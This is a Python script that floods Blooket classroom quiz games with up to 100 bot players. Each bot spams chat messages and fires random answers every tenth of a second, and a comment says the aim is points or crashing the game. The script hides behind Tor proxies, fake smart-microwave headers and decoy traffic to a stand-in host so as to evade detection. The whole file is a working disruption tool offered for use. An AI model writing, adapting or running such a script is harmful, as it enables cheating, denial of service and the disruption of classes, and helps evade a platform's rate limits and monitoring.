# botter.py - Ultimate Single-Script Blooket Botter
import requests
import websocket
import json
import threading
import time
import random
import os

# Microwave Stealth
HEADERS = {
    "User-Agent": "SmartMicrowave/9000",
    "X-Appliance": "Microwave",
    "X-Firmware": "2.1.3",
    "Referer": "https://play.blooket.com/"
}
PROXIES = {"http": "socks5://tor-proxy:9050", "https": "socks5://tor-proxy:9050"}

# Decoy Traffic (mimic appliance)
def decoy_loop():
    while True:
        try:
            requests.get("https://iot-updates.example/firmware", headers=HEADERS, proxies=PROXIES, timeout=5)
        except:
            pass
        time.sleep(random.randint(300, 3600))  # 5-60 min

# Join Game
def join(pin, name):
    url = "https://play.blooket.com/api/players"
    payload = {"gamePin": pin, "name": name}
    try:
        r = requests.post(url, json=payload, headers=HEADERS, proxies=PROXIES)
        if r.ok:
            print(f"[+] {name} joined {pin}")
            return r.json().get('token')
    except:
        pass
    return None

# WebSocket Spam/Answer
def bot_ws(pin, name):
    token = join(pin, name)
    if not token:
        return
    ws_url = f"wss://play.blooket.com/ws?pin={pin}"
    def on_open(ws):
        print(f"[WS] {name} connected")
        # Flood chat
        threading.Thread(target=chat_flood, args=(ws,)).start()
        # Auto-answer (fast random or mock correct)
        threading.Thread(target=answer_flood, args=(ws,)).start()
    def chat_flood(ws):
        msgs = ["Popcorn ready! 🍿", "Beep boop!", "Heating up..."]
        while True:
            ws.send(json.dumps({"type": "chat", "msg": random.choice(msgs)}))
            time.sleep(0.5)
    def answer_flood(ws):
        while True:
            # Submit "correct" (mock - in real: sniff questions)
            ws.send(json.dumps({"type": "answer", "answer": random.choice(["A", "B", "C", "D"])}))
            time.sleep(0.1)  # Ultra-fast for points/crash
    try:
        ws = websocket.WebSocketApp(ws_url, header=HEADERS, on_open=on_open)
        ws.run_forever()
    except:
        pass

# Swarm Launcher
def swarm(pin, count=100):
    print(f"[!] Launching {count} bots on PIN {pin}")
    for i in range(count):
        name = f"MicrowaveBot{random.randint(1,9999)}"
        threading.Thread(target=bot_ws, args=(pin, name)).start()
        time.sleep(0.05)  # Avoid rate-limit

# Main
if __name__ == "__main__":
    threading.Thread(target=decoy_loop, daemon=True).start()
    PIN = os.getenv("BLOOKET_PIN", "123456")  # Set env or change here
    COUNT = int(os.getenv("BOT_COUNT", "50"))
    swarm(PIN, COUNT)
    print("[!] Botter running. Ctrl+C to stop.")
    while True:
        time.sleep(60)  # Keep alive
